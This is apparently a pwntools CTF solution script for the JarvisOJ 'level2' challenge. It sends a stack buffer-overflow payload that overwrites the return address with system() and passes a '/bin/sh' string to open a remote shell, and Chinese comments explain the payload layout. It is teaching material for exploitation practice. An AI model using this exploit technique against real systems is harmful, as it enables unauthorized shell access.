# -*- coding: utf-8 -*-
from pwn import *

r = remote('pwn2.jarvisoj.com', 9878)
elf = ELF('./level2')

junk = b'a'*(0x88+4)
system_addr = elf.symbols['system']
addresses = elf.search(b'/bin/sh')
bin_sh_addr = next(addresses, None)
print("First address=>", bin_sh_addr)

#         buf+ebp   ret_addr           任意     参数
payload = junk   +  p32(system_addr) + p32(0) + p32(bin_sh_addr)
#p32(0)为system函数的返回地址
#返回前已经执行了system('bin/sh')，所以这里可以任意填充

r.send(payload)
r.interactive()
